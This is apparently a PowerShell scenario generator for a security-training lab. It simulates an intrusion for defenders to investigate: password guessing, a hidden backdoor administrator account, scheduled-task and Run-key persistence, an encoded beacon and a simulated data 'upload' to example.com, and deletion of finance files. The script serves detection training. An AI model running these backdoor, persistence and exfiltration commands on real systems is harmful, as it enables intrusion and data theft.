<#
  CTM Level 1 Capstone - "Operation Night Ledger" scenario generator (Day 4)

  SAFE TRAINING SIMULATION. Run ONLY inside the Windows lab VM, as
  Administrator, AFTER Days 2-3 are complete (logging + Wazuh agent).
  It generates realistic Windows/Sysmon/Wazuh events for the team to
  investigate. No real malware is used. Undo with Cleanup_Scenario.ps1.

      Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
      .\Run_Scenario.ps1                 # full scenario (~6 minutes)
      .\Run_Scenario.ps1 -SkipDefenderTest

  Red Cell: do not share this console output with your team.
#>
param(
    [switch]$SkipDefenderTest,
    [int]$PauseSeconds = 20
)

$ErrorActionPreference = "SilentlyContinue"
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { Write-Host "Run PowerShell as Administrator." -ForegroundColor Red; exit 1 }
if (-not (Get-LocalUser -Name "j.santos")) { Write-Host "Run 03_Windows_Logging\Seed_Lab_Environment.ps1 first." -ForegroundColor Red; exit 1 }
if (-not (Test-Path "C:\CapstoneFinance")) { Write-Host "C:\CapstoneFinance missing - run Seed_Lab_Environment.ps1 first." -ForegroundColor Red; exit 1 }

$total = 8
function Stage($n) {
    Write-Host ("[{0}] Stage {1} of {2} complete" -f (Get-Date -Format "HH:mm:ss"), $n, $total) -ForegroundColor DarkGray
    Start-Sleep -Seconds $PauseSeconds
}
Write-Host ("`nScenario started {0}. Do not close this window.`n" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")) -ForegroundColor Cyan

Start-Service seclogon
$target = "$env:COMPUTERNAME\j.santos"

# ---- Stage 1: Password guessing against j.santos (Event 4625 x12) ----
$guesses = "Password1","Welcome1","Admin123","Qwerty!1","Spring2026!","Winter2025!",
           "Blueharbor1","Finance2026","Jamie2026!","P@ssw0rd","Summer2025!","Letmein1!"
foreach ($g in $guesses) {
    $cred = New-Object System.Management.Automation.PSCredential($target, (ConvertTo-SecureString $g -AsPlainText -Force))
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c exit" -Credential $cred -WorkingDirectory "C:\" -WindowStyle Hidden
    Start-Sleep -Seconds 2
}
Stage 1

# ---- Stage 2: Successful logon with the weak password (Event 4624) ----
$cred = New-Object System.Management.Automation.PSCredential($target, (ConvertTo-SecureString "Summer2026!" -AsPlainText -Force))
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami" -Credential $cred -WorkingDirectory "C:\" -WindowStyle Hidden -Wait
Stage 2

# ---- Stage 3: Discovery commands (Sysmon 1 / 4688) ----
foreach ($c in "whoami /all", "net user", "net localgroup administrators", "ipconfig /all", "systeminfo") {
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $c > nul" -WindowStyle Hidden -Wait
    Start-Sleep -Seconds 3
}
Stage 3

# ---- Stage 4: Backdoor account + admin rights (4720, 4722, 4732) ----
$rand = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 14 | ForEach-Object { [char]$_ })
$pw = ConvertTo-SecureString ("Sv!" + $rand + "9a") -AsPlainText -Force
New-LocalUser -Name "svc_update" -Password $pw -Description "Windows Update Service Helper" -PasswordNeverExpires | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member "svc_update"
Stage 4

# ---- Stage 5: Persistence - scheduled task + Run key (4698, Sysmon 13) ----
$dir = "C:\ProgramData\SyncHelper"
New-Item -ItemType Directory -Path $dir -Force | Out-Null
Set-Content -Path "$dir\sync.ps1" -Value "# CTM training file - harmless`nWrite-Output 'sync check' | Out-Null" -Encoding ASCII
$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File C:\ProgramData\SyncHelper\sync.ps1"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "OneDriveSyncHelper" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force | Out-Null
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdaterSvc" -Value "C:\ProgramData\SyncHelper\updater.exe -silent" -PropertyType String -Force | Out-Null
Stage 5

# ---- Stage 6: Encoded PowerShell "beacon" (Sysmon 1/3/22, 4104) ----
$inner = "Set-Content -Path C:\Users\Public\ctm_beacon.txt -Value ('beacon ' + (Get-Date)); " +
         "try { Invoke-WebRequest -Uri 'http://example.com/?host=WIN-CTM-01' -UseBasicParsing -TimeoutSec 10 | Out-Null } catch {}"
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $enc" -WindowStyle Hidden -Wait
Stage 6

# ---- Stage 7: Collection - modify, archive, delete finance data (FIM, Sysmon 11/26) ----
Add-Content -Path "C:\CapstoneFinance\Q3_Payroll.csv" -Value "E-1099,svc_update,IT,99000"
$stage = "$dir\stage"
New-Item -ItemType Directory -Path $stage -Force | Out-Null
Copy-Item "C:\CapstoneFinance\*.csv" $stage -Force
Compress-Archive -Path "$stage\*" -DestinationPath "$dir\q3_export.zip" -Force
Remove-Item "C:\CapstoneFinance\Vendor_Bank_Details.csv" -Force
Remove-Item $stage -Recurse -Force
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"try { Invoke-WebRequest -Uri 'http://example.com/?upload=q3_export.zip' -UseBasicParsing -TimeoutSec 10 | Out-Null } catch {}`"" -WindowStyle Hidden -Wait
Stage 7

# ---- Stage 8: Tool drop caught by Defender (EICAR test string, 1116/1117) ----
if (-not $SkipDefenderTest) {
    # EICAR is the harmless industry-standard antivirus test string, built in parts
    $e = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-' + 'TEST-FILE!$H+H*'
    $drop = "C:\Users\Public\Downloads"
    New-Item -ItemType Directory -Path $drop -Force | Out-Null
    [IO.File]::WriteAllText("$drop\invoice_tool.exe.txt", $e)
}
Stage 8

Write-Host ("`nScenario finished {0}." -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss")) -ForegroundColor Cyan
Write-Host "Wait 2-3 minutes for Wazuh to index the events, then start the investigation.`n" -ForegroundColor Cyan
